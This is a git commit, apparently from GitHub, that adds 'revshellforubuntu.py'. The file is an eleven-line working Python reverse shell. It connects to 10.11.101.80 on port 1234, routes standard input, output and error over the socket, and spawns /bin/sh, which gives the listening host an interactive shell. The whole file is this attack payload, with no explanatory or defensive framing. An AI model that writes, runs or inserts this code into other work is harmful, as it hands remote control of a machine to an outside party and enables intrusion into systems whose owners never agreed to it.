955fa81ec609a71236ba682c75375c9b39772577
Almir <113849047+Dakumiami@users.noreply.github.com>
2024-08-31 07:24:56 -0400

    Add files via upload

---
+++ revshellforubuntu.py
@@ -0,0 +1,11 @@
+import socket,os,pty;
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+
+s.connect(("10.11.101.80",1234));
+
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+
+pty.spawn("/bin/sh")
